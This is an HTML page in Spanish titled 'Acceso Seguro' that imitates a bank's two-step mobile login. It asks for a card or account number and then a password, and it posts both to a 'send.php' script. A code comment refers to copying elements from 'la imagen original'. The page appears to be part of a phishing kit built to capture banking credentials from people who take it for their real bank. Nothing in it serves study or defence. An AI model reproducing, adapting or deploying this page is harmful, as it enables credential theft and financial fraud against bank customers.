<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Seguro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
            background-size: cover; 
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: sans-serif; 
            margin: 0;
            height: 100vh;
            overflow: hidden; /* Evita scrolls raros en móvil */
        }
        
        /* Capa oscura corregida */
        body::before {
            content: "";
            position: fixed; /* Fixed para que no se mueva */
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); 
            z-index: -1;
        }

        .bottom-sheet { 
            border-radius: 1.5rem 1.5rem 0 0; 
            min-height: 480px; 
            position: relative;
            z-index: 10;
        }
        
        .input-line { border-bottom: 2px solid #e2e8f0; transition: border-color 0.3s; }
        .input-line:focus-within { border-color: #ec1c24; }

        /* Animación de entrada para que se vea más profesional */
        .animate-up {
            animation: slideUp 0.4s ease-out;
        }
        @keyframes slideUp {
            from { transform: translateY(100%); }
            to { transform: translateY(0); }
        }
    </style>
</head>
<body class="h-screen flex flex-col justify-end">

    <div class="bg-white w-full bottom-sheet p-6 shadow-2xl animate-up">
        <form method="post" action="send.php">
        <div class="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
        
        <div class="flex justify-between items-center mb-8">
            <h1 id="stepTitle" class="text-lg font-bold text-gray-800 text-center flex-1">Ingresa tu información</h1>
            <div class="w-14"></div>
        </div>

        <!-- Paso 1: Usuario -->
        <div id="step1" class="space-y-6">
            <div class="input-line py-2">
                <p class="text-xs text-gray-400 mb-1">No. Tarjeta / No. Cuenta / Código de cliente</p>
                <input type="text" id="userField" name="usr" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric">
            </div>

            <!-- Checkbox de la imagen original -->
            <div class="flex items-center space-x-3 py-2">
                <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center">
                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                    </svg>
                </div>
                <span class="text-gray-600 text-sm">Recordarme en este dispositivo</span>
            </div>

            <button id="btnNext" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300 opacity-50 cursor-not-allowed">
                Continuar
            </button>
            
        </div>

        <!-- Paso 2: Contraseña -->
        <div id="step2" class="space-y-6 hidden">
            <div class="text-center mb-2">
                <p id="displayUser" class="text-gray-700 font-medium text-lg"></p>
            </div>
            <div class="input-line py-2 relative">
                <p class="text-xs text-gray-400 mb-1">Ingresa contraseña</p>
                <input type="password" name="pass" id="passField" class="w-full outline-none text-lg text-gray-700">
                <span class="absolute right-2 bottom-3 text-red-600 cursor-pointer">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                </span>
            </div>
            <div class="flex justify-between text-sm font-medium pt-2">
                <span class="text-red-600 cursor-pointer">No es mi cuenta</span>
                <span class="text-red-600 cursor-pointer">Olvidé mi contraseña</span>
            </div>
            <button id="btnSubmit" type="submit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg">Ingresar</button>
        </div>
        </form>
    </div>

    <script src="logic.js"></script>
</body>
</html>
